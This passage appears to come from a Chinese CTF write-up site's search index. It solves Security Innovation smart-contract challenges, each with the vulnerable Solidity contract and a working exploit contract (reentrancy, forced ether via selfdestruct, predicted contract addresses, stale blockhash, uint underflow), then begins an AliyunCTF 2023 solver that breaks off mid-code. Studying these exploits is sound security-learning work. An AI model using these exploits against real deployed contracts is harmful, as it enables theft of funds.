if (msg.sender.call.value(allowancePerYear)()){\n            withdrewThisYear = true;\n            numberOfWithdrawls = numberOfWithdrawls.add(1);\n        }\n    }\n\n    function returnFunds() external payable ctf{\n        require(msg.value == allowancePerYear, \"Incorrect Transaction Value\");\n        require(withdrewThisYear==true, \"Cannot Return Funds Before Withdraw\");\n        withdrewThisYear = false;\n        numberOfWithdrawls=numberOfWithdrawls.sub(1);\n    }\n}\n</code></pre> <p>\u91cd\u5165\u653b\u51fb\uff0c\u5199\u4e00\u4e2a\u653b\u51fb\u5408\u7ea6\uff0c\u5728\u5176 fallback \u4e2d\u518d\u6b21\u8c03\u7528 withdraw \u51fd\u6570\u5c31\u53ef\u4ee5\u5b9e\u73b0\u91cd\u5165\uff0c\u6ce8\u610f\u8981\u5728 MetaMask \u53d1\u9001\u4ea4\u6613\u65f6\u63d0\u9ad8\u4e00\u4e0b gas\uff0c\u4e0d\u7136\u5185\u90e8\u7684\u4ea4\u6613\u4f1a\u51fa\u73b0 gas \u4e0d\u8db3\u7684\u95ee\u9898</p> exp <pre><code>contract Exploit {\n    TrustFund challenge;\n    constructor(address addr) public {\n        challenge = TrustFund(addr);\n    }\n    function exp() public {\n        challenge.withdraw();\n    }\n    function() public payable {\n        challenge.withdraw();\n    }\n    function destroy(address addr) public {\n        selfdestruct(addr);\n    }\n}\n</code></pre>"}, {"location": "writeups/SecurityInnovation/#record-label", "title": "Record Label", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\n\ncontract Royalties{\n\n    using SafeMath for uint256;\n\n    address private collectionsContract;\n    address private artist;\n\n    address[] private receiver;\n    mapping(address =&gt; uint256) private receiverToPercentOfProfit;\n    uint256 private percentRemaining;\n\n    uint256 public amountPaid;\n\n    constructor(address _manager, address _artist) public\n    {\n        collectionsContract = msg.sender;\n        artist=_artist;\n\n        receiver.push(_manager);\n        receiverToPercentOfProfit[_manager] = 80;\n        percentRemaining = 100 - receiverToPercentOfProfit[_manager];\n    }\n\n    modifier isCollectionsContract() { \n        require(msg.sender == collectionsContract, \"Unauthorized: Not Collections Contract\");\n        _;\n    }\n\n    modifier isArtist(){\n        require(msg.sender == artist, \"Unauthorized: Not Artist\");\n        _;\n    }\n\n    function addRoyaltyReceiver(address _receiver, uint256 _percent) external isArtist{\n        require(_percent&lt;percentRemaining, \"Precent Requested Must Be Less Than Percent Remaining\");\n        receiver.push(_receiver);\n        receiverToPercentOfProfit[_receiver] = _percent;\n        percentRemaining = percentRemaining.sub(_percent);\n    }\n\n    function payoutRoyalties() public payable isCollectionsContract{\n        for (uint256 i = 0; i&lt; receiver.length; i++){\n            address current = receiver[i];\n            uint256 payout = msg.value.mul(receiverToPercentOfProfit[current]).div(100);\n            amountPaid = amountPaid.add(payout);\n            current.transfer(payout);\n        }\n        msg.sender.call.value(msg.value-amountPaid)(bytes4(keccak256(\"collectRemainingFunds()\")));\n    }\n\n    function getLastPayoutAmountAndReset() external isCollectionsContract returns(uint256){\n        uint256 ret = amountPaid;\n        amountPaid = 0;\n        return ret;\n    }\n\n    function () public payable isCollectionsContract{\n        payoutRoyalties();\n    }\n}\n\ncontract Manager{\n    address public owner;\n\n    constructor(address _owner) public {\n        owner = _owner;\n    }\n\n    function withdraw(uint256 _balance) public {\n        owner.transfer(_balance);\n    }\n\n    function () public payable{\n        // empty\n    }\n}\n\ncontract RecordLabel is CtfFramework{\n\n    using SafeMath for uint256;\n\n    uint256 public funds;\n    address public royalties;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    {\n        royalties = new Royalties(new Manager(_ctfLauncher), _player);\n        funds = funds.add(msg.value);\n    }\n\n    function() external payable ctf{\n        funds = funds.add(msg.value);\n    }\n\n\n    function withdrawFundsAndPayRoyalties(uint256 _withdrawAmount) external ctf{\n        require(_withdrawAmount&lt;=funds, \"Insufficient Funds in Contract\");\n        funds = funds.sub(_withdrawAmount);\n        royalties.call.value(_withdrawAmount)();\n        uint256 royaltiesPaid = Royalties(royalties).getLastPayoutAmountAndReset();\n        uint256 artistPayout = _withdrawAmount.sub(royaltiesPaid); \n        msg.sender.transfer(artistPayout);\n    }\n\n    function collectRemainingFunds() external payable{\n        require(msg.sender == royalties, \"Unauthorized: Not Royalties Contract\");\n    }\n\n}\n</code></pre> <p>\u5408\u7ea6\u770b\u8d77\u6765\u5f88\u957f\uff0c\u4f46\u662f\u5927\u81f4\u770b\u4e00\u4e0b\u7684\u8bdd\u5c31\u53ef\u4ee5\u770b\u51fa\u8c03\u7528 withdrawFundsAndPayRoyalties \u51fd\u6570\u7684\u65f6\u5019\u4f1a\u628a\u5168\u90e8\u7684 _withdrawAmount \u5168\u90e8\u4f20\u7ed9 Royalties\uff0c\u5176\u4e2d\u4f1a\u5c06 80% \u4f20\u7ed9\u6211\u4eec\uff0c\u518d\u628a 20% \u4f20\u56de\u53bb\uff0c\u800c\u8fd9 20% \u53c8\u4f1a\u5728 withdrawFundsAndPayRoyalties \u4e2d\u518d\u4f20\u7ed9\u6211\u4eec\u3002\u6240\u4ee5\u53ea\u9700\u8981\u76f4\u63a5\u8c03\u7528 withdrawFundsAndPayRoyalties \u51fd\u6570\u5c06 1 ether \u63d0\u53d6\u51fa\u6765\u5c31\u53ef\u4ee5\u4e86</p>"}, {"location": "writeups/SecurityInnovation/#slot-machine", "title": "Slot Machine", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\ncontract SlotMachine is CtfFramework{\n\n    using SafeMath for uint256;\n\n    uint256 public winner;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    {\n        winner = 5 ether;\n    }\n\n    function() external payable ctf{\n        require(msg.value == 1 szabo, \"Incorrect Transaction Value\");\n        if (address(this).balance &gt;= winner){\n            msg.sender.transfer(address(this).balance);\n        }\n    }\n\n}\n</code></pre> <p>\u76ee\u6807\u662f\u8ba9\u9898\u76ee\u5408\u7ea6\u8d26\u6237\u4e2d\u7684\u4f59\u989d\u4e0d\u5c11\u4e8e 5 ether\uff0c\u800c\u4e14\u5408\u7ea6\u4e2d\u7684 fallback \u51fd\u6570\u53ea\u63a5\u6536 1 szabo</p> <p>\u4f46\u662f\u5982\u679c\u901a\u8fc7\u53e6\u4e00\u4e2a\u5408\u7ea6\u7684 selfdestruct \u6765\u5c06\u5269\u4f59\u4f59\u989d\u5168\u90e8\u8f6c\u79fb\u5230\u9898\u76ee\u5408\u7ea6\u4e0a\u7684\u8bdd\u662f\u4e0d\u4f1a\u7ecf\u8fc7 fallback \u51fd\u6570\u7684\uff0c\u6240\u4ee5\u521b\u5efa\u53e6\u4e00\u4e2a\u5408\u7ea6\uff0c\u8f6c\u5165\u4e0d\u5c11\u4e8e 3.5 ether \u7136\u540e\u518d selfdestruct \u5c31\u53ef\u4ee5\u4e86 </p> exp <pre><code>contract Exploit {\n    address challenge;\n    constructor(address addr) public payable {\n        challenge = addr;\n    }\n    function exp() public {\n        selfdestruct(challenge);\n    }\n}\n</code></pre>"}, {"location": "writeups/SecurityInnovation/#rainy-day-fund", "title": "Rainy Day Fund", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\n\ncontract DebugAuthorizer{\n\n    bool public debugMode;\n\n    constructor() public payable{\n        if(address(this).balance == 1.337 ether){\n            debugMode=true;\n        }\n    }\n}\n\ncontract RainyDayFund is CtfFramework{\n\n    address public developer;\n    mapping(address=&gt;bool) public fundManagerEnabled;\n    DebugAuthorizer public debugAuthorizer;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    {\n        //debugAuthorizer = (new DebugAuthorizer).value(1.337 ether)(); // Debug mode only used during development\n        debugAuthorizer = new DebugAuthorizer();\n        developer = msg.sender;\n        fundManagerEnabled[msg.sender] = true;\n    }\n\n    modifier isManager() {\n        require(fundManagerEnabled[msg.sender] || debugAuthorizer.debugMode() || msg.sender == developer, \"Unauthorized: Not a Fund Manager\");\n        _;\n    }\n\n    function () external payable ctf{\n        // Anyone can add to the fund    \n    }\n\n    function addFundManager(address _newManager) external isManager ctf{\n        fundManagerEnabled[_newManager] = true;\n    }\n\n    function removeFundManager(address _previousManager) external isManager ctf{\n        fundManagerEnabled[_previousManager] = false;\n    }\n\n    function withdraw() external isManager ctf{\n        msg.sender.transfer(address(this).balance);\n    }\n}\n</code></pre> <p>\u8f6c\u51fa\u6240\u6709\u94b1\u7684\u8bdd\u8981\u8c03\u7528 withdraw \u51fd\u6570\uff0c\u5b83\u5e26\u6709 isManager \u8fd9\u4e2a modifier\uff0c\u800c manager \u6211\u4eec\u6539\u4e0d\u4e86\uff0c\u6240\u4ee5\u601d\u8def\u5728\u4e8e\u5f00\u542f debug mode</p> <p>\u4f46\u662f\u9898\u76ee\u7684 constructor \u4e2d\u4f1a\u521b\u5efa DebugAuthorizer \u5408\u7ea6\u5b9e\u4f8b\u800c\u4e14\u5e76\u4e0d\u5411\u5176\u4e2d\u8f6c\u5165 1.337 ether\uff0c\u4e5f\u5c31\u4e0d\u4f1a\u6253\u5f00 debug mode\uff0c\u540e\u7eed\u518d\u5411\u5176\u4e2d\u8f6c\u8d26\u7684\u8bdd\u4e5f\u4e0d\u4f1a\u6253\u5f00 debug mode\uff08\u56e0\u4e3a\u8fd9\u4e2a\u662f\u5728 constructor \u4e2d\u8d4b\u503c\u7684\uff09</p> <p>\u6240\u4ee5\u5c31\u9700\u8981\u63d0\u524d\u8ba1\u7b97\u51fa\u4e0b\u4e00\u6b21 developer \u90e8\u7f72\u7684\u9898\u76ee\u5408\u7ea6\u7684\u5730\u5740\uff0c\u518d\u63d0\u524d\u8ba1\u7b97\u51fa\u5176\u521b\u5efa\u7684 DebugAuthorizer \u7684\u5730\u5740\uff0c\u5148\u5411\u5176\u4e2d\u8f6c\u5165 1.337 ether\uff0c\u8fd9\u65f6\u91cd\u542f\u9898\u76ee\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u9898\u76ee\u5408\u7ea6\uff0c\u5176\u4e2d\u521b\u5efa DebugAuthorizer \u65f6\u68c0\u67e5 balance \u53d1\u73b0\u5df2\u7ecf\u6709\u4e86 1.337 ether\uff0c\u4e5f\u5c31\u6253\u5f00\u4e86 debug mode \u53ef\u4ee5\u76f4\u63a5 withdraw</p> <p>\u800c\u63d0\u524d\u8ba1\u7b97\u5408\u7ea6\u5730\u5740\u7684\u65b9\u6cd5\u5c31\u662f\u8fd0\u7528 create \u7684\u539f\u7406\uff0c\u5373\u5916\u90e8\u8d26\u6237\u521b\u5efa\u5408\u7ea6\u6216\u8005\u5728\u5408\u7ea6\u4e2d\u901a\u8fc7 CREATE \u64cd\u4f5c\u7801\u521b\u5efa\u65b0\u5408\u7ea6\u7684\u65f6\u5019\u8ba1\u7b97\u5730\u5740\u7684\u7b97\u6cd5\u662f\uff1a <pre><code>keccak(rlp.encode([deployer, nonce]))\n</code></pre> \u5e76\u4e14\u5728\u5408\u7ea6\u5185\u90e8\u901a\u8fc7 CREATE \u521b\u5efa\u65b0\u5408\u7ea6\u7684\u8bdd\uff0cnonce \u5e94\u8be5\u662f 1</p> <p>\u76ee\u524d\u9700\u8981\u77e5\u9053\u7684\u662f developer\uff08\u53ef\u4ee5\u901a\u8fc7 etherscan \u67e5\u5230\uff09\u90e8\u7f72\u5f53\u524d\u9898\u76ee\u5408\u7ea6\u65f6\u7684 nonce \u662f\u591a\u5c11\uff08\u77e5\u9053\u4e86\u8fd9\u4e2a\u4e4b\u540e\u4e0b\u4e00\u6b21\u518d\u90e8\u7f72\u7684 nonce \u5c31\u662f\u5176\u52a0\u4e00\uff09\uff0c\u53ea\u9700\u8981\u679a\u4e3e\u4e00\u4e0b nonce \u8ba1\u7b97\u5730\u5740\u518d\u548c\u5f53\u524d\u9898\u76ee\u5730\u5740\u6bd4\u8f83\u4e00\u4e0b\u5c31\u53ef\u4ee5\u7206\u7834\u51fa\u6765\uff1a <pre><code>import rlp\nimport web3\n\ndef calc_address(deployer, nonce):\n    return web3.Web3.keccak(rlp.encode([deployer, nonce]))\n\nfor nonce in range(1, 1000000):\n    if calc_address(0xeD0D5160c642492b3B482e006F67679F5b6223A2, nonce).hex().endswith(\"66318f6b06fd5769fa310732566b13d92cfbc589\"):\n        print(nonce)\n        break\n</code></pre> \u53ef\u4ee5\u5f97\u5230\u5f53\u524d nonce \u662f 484\uff0c\u6240\u4ee5\u4e0b\u4e00\u6b21\u518d\u90e8\u7f72\u9898\u76ee\u7684 nonce \u5c31\u662f 485\u3002\u7136\u540e\u63d0\u524d\u8ba1\u7b97\u9898\u76ee\u5730\u5740\u548c DebugAuthorizer \u5730\u5740\uff1a <pre><code>deployer = 0xeD0D5160c642492b3B482e006F67679F5b6223A2\nnonce = 485\n\nchallenge = int(calc_address(deployer, nonce).hex()[-40:], 16)\nprint(f\"next challenge address: {hex(challenge)}\")\n\ndebug = int(calc_address(challenge, 1).hex()[-40:], 16)\nprint(f\"next DebugAuthorizer address: {hex(debug)}\")\n\"\"\"\nnext challenge address: 0xe3ddc258e3c557c11d8f54bb72583bd36d7af22d\nnext DebugAuthorizer address: 0xe177fc1703942b50cd95a87bb9dfa4ab3cf3a1fe\n\"\"\"\n</code></pre> \u6240\u4ee5\u5148\u5411 0xe177fc1703942b50cd95a87bb9dfa4ab3cf3a1fe \u8f6c\u8d26 1.337 ether\uff0c\u518d\u91cd\u7f6e\u9898\u76ee\uff08\u53ef\u4ee5\u9a8c\u8bc1\u4e00\u4e0b\u73b0\u5728\u7684\u9898\u76ee\u5730\u5740\u5c31\u662f 0xe3ddc258e3c557c11d8f54bb72583bd36d7af22d\uff09\uff0c\u76f4\u63a5\u8c03\u7528 withdraw \u51fd\u6570\u5c31\u53ef\u4ee5\u4e86</p>"}, {"location": "writeups/SecurityInnovation/#raffle", "title": "Raffle", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\n\ncontract Raffle is CtfFramework{\n\n    uint256 constant fee = 0.1 ether;\n\n    address private admin;\n\n    bytes4 private winningTicket;\n    uint256 private blocknum;\n\n    uint256 public ticketsBought;\n    bool public raffleStopped;\n\n    mapping(address=&gt;uint256) private rewards;\n    mapping(address=&gt;bool) private potentialWinner;\n    mapping(address=&gt;bytes4) private ticketNumbers;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    {\n        rewards[address(this)] = msg.value;\n        admin = msg.sender;\n    }\n\n    function buyTicket() external payable ctf{\n        if(msg.value &gt;= fee){\n            winningTicket = bytes4(0);\n            blocknum = block.number+1;\n            ticketsBought += 1;\n            raffleStopped = false;\n            rewards[msg.sender] += msg.value;\n            ticketNumbers[msg.sender] = bytes4((msg.value - fee)/10**8);\n            potentialWinner[msg.sender] = true;\n        }\n    }\n\n    function closeRaffle() external ctf{\n        require(ticketsBought&gt;0);\n        require(!raffleStopped);\n        require(blocknum != 0);\n        require(winningTicket == bytes4(0));\n        require(block.number&gt;blocknum);\n        require(msg.sender==admin || rewards[msg.sender]&gt;0);\n        winningTicket = bytes4(blockhash(blocknum));\n        potentialWinner[msg.sender] = false;\n        raffleStopped = true;\n    }\n\n    function collectReward() external payable ctf{\n        require(raffleStopped);\n        require(potentialWinner[msg.sender]);\n        rewards[address(this)] += msg.value;\n        if(winningTicket == ticketNumbers[msg.sender]){\n            msg.sender.transfer(rewards[msg.sender]);\n            msg.sender.transfer(rewards[address(this)]); \n            rewards[msg.sender] = 0;\n            rewards[address(this)] = 0;\n        }\n    }\n\n    function skimALittleOffTheTop(uint256 _value) external ctf{\n        require(msg.sender==admin);\n        require(rewards[address(this)]&gt;_value);\n        rewards[address(this)] = rewards[address(this)] - _value;\n        msg.sender.transfer(_value);\n    }\n\n    function () public payable ctf{\n        if(msg.value&gt;=fee){\n            this.buyTicket();\n        }\n        else if(msg.value == 0){\n            this.closeRaffle();\n        }\n        else{\n            this.collectReward();\n        }\n    }\n\n}\n</code></pre> <p>\u662f\u4e00\u4e2a\u62bd\u5956\uff0c\u9700\u8981\u901a\u8fc7 buyTicket \u4e70\u7968\u83b7\u5f97\u8d44\u683c\uff0c\u5e76\u4e14 ticketNumbers \u4e3a (msg.value - fee)/10**8\uff0c\u7ed3\u675f\u62bd\u5956\u9700\u8981\u8c03\u7528 closeRaffle \u51fd\u6570\uff0c\u4f46\u662f\u8fd9\u4e5f\u4f1a\u53d6\u6d88\u62bd\u5956\u8d44\u683c\u3002\u800c\u6700\u540e\u62bd\u4e2d\u7684 ticketNumbers \u4e3a\u6700\u540e\u4e00\u4e2a\u4e70\u7968\u7684 blocknum \u7684 blockhash</p> <p>\u8fd9\u5c31\u6709\u4e86\u4e00\u4e2a\u6f0f\u6d1e\uff0cblockhash \u53ea\u4f1a\u8ba1\u7b97\u6700\u8fd1\u7684 256 \u4e2a\u5757\uff0c\u518d\u65e9\u7684\u7ed3\u679c\u4f1a\u662f 0</p> <p>\u4f46\u662f\u5982\u679c\u4f7f\u7528\u4e24\u4e2a\u5408\u7ea6\u4e00\u4e2a\u6765\u5173\u95ed\u62bd\u5956\uff0c\u53e6\u4e00\u4e2a\u9886\u5956\u7684\u8bdd\uff0c\u4e0d\u80fd\u53d6\u51fa\u5168\u90e8\u7684\u4f59\u989d\uff08\u56e0\u4e3a\u5173\u95ed\u62bd\u5956\u7684\u8d26\u6237\u4e70\u7968\u7684\u94b1\u4e0d\u4f1a\u8f6c\u51fa\u6765\uff09\u3002\u56e0\u6b64\u9700\u8981\u901a\u8fc7 fallback \u51fd\u6570\uff0cvalue \u4e3a 0 \u7684\u65f6\u5019\u4f1a\u8c03\u7528 closeRaffle\uff0c\u8fd9\u4f1a\u4f7f closeRaffle \u5224\u65ad\u7684 msg.sender \u4e3a\u81ea\u8eab\u3002\u6240\u4ee5\u53ea\u9700\u8981\u4e70\u4e0b\u7968\uff0c\u7136\u540e\u7b49\u5f85\u51fa 256 \u4e2a\u5757\u4e4b\u540e\u89e6\u53d1 fallback \u7136\u540e\u518d collectReward \u5c31\u597d\u4e86</p> <p>\u8fd9\u91cc\u6ce8\u610f\u8fd8\u8981\u628a\u9898\u76ee\u5408\u7ea6\u5730\u5740\u901a\u8fc7\u8c03\u7528 ctf_challenge_add_authorized_sender \u52a0\u5165\u767d\u540d\u5355\uff0c\u624d\u53ef\u4ee5\u5728 fallback \u4e2d\u8c03\u7528\u81ea\u8eab\u51fd\u6570</p> exp <pre><code>contract Exploit {\n    Raffle challenge;\n    constructor(address addr) public {\n        challenge = Raffle(addr);\n    }\n    function buyTicket() public payable {\n        challenge.buyTicket.value(msg.value)();\n    }\n    function exp() public {\n        address(challenge).call.value(0 ether)();\n        challenge.collectReward();\n    }\n    function() public payable {}\n    function destroy(address addr) public {\n        selfdestruct(addr);\n    }\n}\n</code></pre>"}, {"location": "writeups/SecurityInnovation/#scratchcard", "title": "Scratchcard", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\n\nlibrary Address {\n    function isContract(address account) internal view returns (bool) {\n        uint256 size;\n        assembly { size := extcodesize(account) }\n        return size &gt; 0;\n    }\n}\n\ncontract Scratchcard is CtfFramework{\n\n    event CardPurchased(address indexed player, uint256 cost, bool winner);\n\n    mapping(address=&gt;uint256) private winCount;\n    uint256 private cost;\n\n\n    using Address for address;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    {\n    }\n\n    modifier notContract(){\n        require(!msg.sender.isContract(), \"Contracts Not Allowed\");\n        _;\n    }\n\n    function play() public payable notContract ctf{\n        bool won = false;\n        if((now%10**8)*10**10 == msg.value){\n            won = true;\n            winCount[msg.sender] += 1;\n            cost = msg.value;\n            msg.sender.transfer(cost);\n        }\n        else{\n            cost = 0;\n            winCount[msg.sender] = 0;\n        }\n        emit CardPurchased(msg.sender, msg.value, won);\n    }    \n\n    function checkIfMegaJackpotWinner() public view returns(bool){\n        return(winCount[msg.sender]&gt;=25);\n    }\n\n    function collectMegaJackpot(uint256 _amount) public notContract ctf{\n        require(checkIfMegaJackpotWinner(), \"User Not Winner\");\n        require(2 * cost - _amount &gt; 0, \"Winners May Only Withdraw Up To 2x Their Scratchcard Cost\");\n        winCount[msg.sender] = 0;\n        msg.sender.transfer(_amount);\n    }\n\n    function () public payable ctf{\n        play();\n    }\n\n}\n</code></pre> <p>\u8c03\u7528 play \u6765\u731c\u968f\u673a\u6570\uff0cplay \u51fd\u6570\u6709\u4e00\u4e2a notContract \u7684 modifier\uff0c\u8fd9\u4e2a\u53ef\u4ee5\u901a\u8fc7\u5728 constructor \u4e2d\u76f4\u63a5\u64cd\u4f5c\u6765\u7ed5\u8fc7\uff0c\u56e0\u6b64\u53ef\u4ee5\u76f4\u63a5\u5728\u653b\u51fb\u5408\u7ea6\u4e2d\u8c03\u7528 25 \u6b21 play \u51fd\u6570\u6765\u8fbe\u5230\u6761\u4ef6\uff0c\u8f6c\u51fa\u7684\u65f6\u5019\u867d\u7136\u5224\u65ad\u4e86 <code>2*cost - _amount &gt; 0</code> \u4f46\u90fd\u662f uint \u53ef\u4ee5\u4e0b\u6ea2\uff0c\u6240\u4ee5\u76f4\u63a5\u8f6c\u51fa\u5168\u90e8\u5c31\u597d\u4e86</p> <p>\u53e6\u5916\u8fd8\u9700\u8981\u63d0\u524d\u8ba1\u7b97\u4e00\u4e0b\u653b\u51fb\u5408\u7ea6\u7684\u5730\u5740\uff0c\u518d\u8c03\u7528 ctf_challenge_add_authorized_sender \u51fd\u6570\u9884\u5148\u628a\u8981\u90e8\u7f72\u7684\u653b\u51fb\u5408\u7ea6\u7684\u4f4d\u7f6e\u52a0\u5165\u767d\u540d\u5355\u540e\u624d\u53ef\u4ee5\u90e8\u7f72\u653b\u51fb\u5408\u7ea6</p> exp <pre><code>contract Attacker {\n    Scratchcard challenge;\n    uint public count;\n    uint public money;\n    constructor(address addr, address player) public payable {\n        challenge = Scratchcard(addr);\n        count = 0;\n        while (count &lt; 25) {\n            money = (now%10**8)*10**10;\n            challenge.play.value(money)();\n            count += 1;\n        }\n        challenge.collectMegaJackpot(addr.balance);\n        selfdestruct(player);\n    }\n    function() public payable {}\n}\n\ncontract Exploit {\n    Scratchcard challenge;\n    address player;\n    uint8 public nonce;\n    constructor(address addr, address _player) public {\n        challenge = Scratchcard(addr);\n        player = _player;\n        nonce = 1;\n    }\n    function exp() public payable {\n        address attacker = address(keccak256(0xd6, 0x94, this, nonce));\n        nonce += 1;\n        challenge.ctf_challenge_add_authorized_sender(attacker);\n        address(attacker).transfer(4 ether);\n        Attacker newAttacker = new Attacker(address(challenge), player);\n    }\n    function() public payable {}\n    function destroy() public {\n        selfdestruct(player);\n    }\n}\n</code></pre>"}, {"location": "writeups/aliyunctf2023/", "title": "AliyunCTF 2023 Writeup", "text": "<p> \u7ea6 1660 \u4e2a\u5b57  344 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 10 \u5206\u949f</p> <p>Abstract</p> <p>\u963f\u91cc\u4e91\u7b2c\u4e00\u6b21\u529e CTF\uff0c\u5956\u91d1\u6bd4\u8f83\u591a\uff0c\u9898\u76ee\u4e0d\u7b80\u5355\uff0c\u505a\u4e86\u51e0\u4e2a misc\uff0c\u6709\u70b9\u70e6</p>"}, {"location": "writeups/aliyunctf2023/#oobdetection", "title": "OOBdetection", "text": "<p>\u7ed9\u51fa\u4e86\u4e00\u4e2a\u65b0\u5b9a\u4e49\u7684\u7b80\u5355\u8bed\u8a00\u7684 EBNF \u63cf\u8ff0\uff0c\u8981\u6c42\u5728\u4e24\u5206\u949f\u5185\u5224\u65ad\u4e09\u767e\u4e2a\u7a0b\u5e8f\u662f\u5426\u4f1a\u4ea7\u751f\u6570\u7ec4\u8d8a\u754c\uff08oob\uff09\u6216\u8005\u5176\u4ed6\u9519\u8bef\uff08unknown\uff09\u3002</p> <p>\u7ed9\u4e86 EBNF \u6240\u4ee5\u5c31\u76f4\u63a5\u987a\u7740\u8d70\u7f16\u8bd1\u539f\u7406 interpreter \u90a3\u8def\uff0c\u6ca1\u5b66\u8fc7\u7f16\u8bd1\u539f\u7406\uff0c\u641c\u4e86\u641c\u770b python \u6709 lark-parser \u53ef\u4ee5\u89e3\u6790\uff0c\u4f46\u662f\u9898\u7ed9\u7684 EBNF \u5199\u6cd5\u4e0d\u80fd\u7528\uff0c\u6539\u4e86\u6539\uff08\u8fd9\u4e2a lark \u611f\u89c9\u8981\u6c42\u7684\u5199\u6cd5\u8fd8\u633a\u4e25\u683c\u7684\uff09\uff1a</p> SC \u8bed\u8a00 EBNF \u63cf\u8ff0 <pre><code>prog : deflist arrlist\n\ndeflist : (vardef \";\")*\n\narrlist : (arrayexpr \";\")*\n\nTYPENAME : \"int\"      \n\nvardef : TYPENAME ID (\"[\" expr \"]\")*\n       | TYPENAME ID \"=\" DIGITSEQUENCE \n\narrayunit : ID \"[\" expr \"]\" (\"[\" expr \"]\")*\n\narrayexpr : ID ASSIGNMENTOPERATOR arrayunit\n          | ID ASSIGNMENTOPERATOR expr\n          | arrayunit ASSIGNMENTOPERATOR expr\n\nexpr : arrayunit OP expr\n     | ID OP expr    \n     | DIGITSEQUENCE OP expr \n     | arrayunit                         \n     | ID                        \n     | DIGITSEQUENCE\n\nOP : \"/\" | \"*\" | \"+\" | \"-\"\n\nID : IDNONDIGIT (IDNONDIGIT | DIGIT)*\n\nDIGITSEQUENCE : NZDIGIT DIGIT*\n\nNZDIGIT : \"1\" | \"2\" | \"3\" | \"4\" | \"5\" | \"6\" | \"7\" | \"8\" | \"9\"\n\nDIGIT : \"0\" |  \"1\" | \"2\" | \"3\" | \"4\" | \"5\" | \"6\" | \"7\" | \"8\" | \"9\"\n\nIDNONDIGIT : \"a\"..\"z\" | \"A\"..\"Z\" | \"_\"\n\nASSIGNMENTOPERATOR : \"=\"\n\n%ignore \" \"\n%ignore \"\\n\"\n</code></pre> <p>\u7136\u540e\u4e22\u7ed9 lark\uff0c\u521b\u5efa\u4e00\u4e2a parser \u5c31\u53ef\u4ee5\u5bf9\u8f93\u5165\u7684\u7a0b\u5e8f\u5206\u6790\u51fa ast \u4e86\uff0c\u7136\u540e\u9012\u5f52\u904d\u5386 ast \u5373\u53ef\u3002</p> <p>\u53ef\u4ee5\u521b\u5efa\u4e24\u4e2a\u5b57\u5178\uff0c\u4e00\u4e2a\u5b58\u53d8\u91cf\u3001\u4e00\u4e2a\u5b58\u5b57\u5178\u3002\u4e3a\u4e86\u5224\u65ad\u8d8a\u754c\u9519\u8bef\uff0c\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u662f\u8ddf\u7740\u7a0b\u5e8f\u4e00\u8d77\u5728 python \u5185\u521b\u5efa\u51fa\u4e00\u4e2a\u540c\u6837\u5927\u5c0f\u7684\u6570\u7ec4\uff0c\u5728\u8bbf\u95ee\u7684\u65f6\u5019\u5982\u679c\u8d8a\u754c\u4f1a\u629b\u51fa IndexError \u5f02\u5e38\uff0ctry-except \u6355\u83b7\u5373\u53ef\u3002\u540c\u65f6\u8fd8\u8981\u6ce8\u610f python \u662f\u652f\u6301\u8d1f\u6570\u7d22\u5f15\u8bbf\u95ee\u7684\uff0c\u6240\u4ee5\u5728\u8bbf\u95ee\u4e4b\u524d\u8fd8\u8981\u7279\u522b\u5224\u65ad\u4e00\u4e0b\u8d1f\u6570\u7d22\u5f15\u7684\u60c5\u51b5\uff0c\u6b64\u65f6\u4e5f\u5e94\u8be5 oob\u3002</p> <p>\u5bf9\u4e8e\u5176\u4ed6\u9519\u8bef\uff0c\u5982\u679c\u53d8\u91cf\u6216\u8005\u6570\u7ec4\u6ca1\u5b9a\u4e49\u5c31\u8fdb\u884c\u4e86\u4f7f\u7528\uff0c\u8fd9\u65f6\u4f1a\u629b\u51fa KeyError\uff0c\u4e5f\u662f\u6355\u83b7\u4e00\u4e0b\u5c31\u53ef\u4ee5\uff0c\u9664\u6b64\u4e4b\u5916\u7684\u9519\u8bef\u5c31\u662f\u9664\u4ee5\u96f6\u7684\u9519\u8bef\uff0c\u5224\u65ad\u4e00\u4e0b\u6216\u8005\u6355\u83b7 ZeroDivisionError \u90fd\u53ef\u4ee5\u3002</p> exp <pre><code>from pwn import *\nfrom hashlib import sha256\nfrom lark import Lark, Token\n\np = remote(...)\n\nparser = Lark(r\"\"\"\n    ...\n\"\"\", start = \"prog\")\n\nvar = {}\narr = {}\n\ndef array_unit(tree):\n    Id = tree.children[0].value\n    res = arr[Id]\n    for child in tree.children[1:]:\n        sub = expr_sc(child)\n        if sub &lt; 0:\n            raise IndexError\n        res = res[sub]\n    if res == \"unknown\":\n        raise KeyError\n    return res\n\ndef array_unit_write(tree, val):\n    Id = tree.children[0].value\n    res = arr[Id]\n    for child in tree.children[1:-1]:\n        sub = expr_sc(child)\n        if sub &lt; 0:\n            raise IndexError\n        res = res[sub]\n    sub = expr_sc(tree.children[-1])\n    if sub &lt; 0:\n        raise IndexError\n    res[sub] = val\n\ndef expr_sc(tree):\n    if isinstance(tree, Token):\n        if tree.type == \"DIGITSEQUENCE\":\n            return int(tree.value)\n        elif tree.type == \"ID\":\n            if var[tree.value] == \"unknown\":\n                raise KeyError\n            else:\n                return var[tree.value]\n        else:\n            return 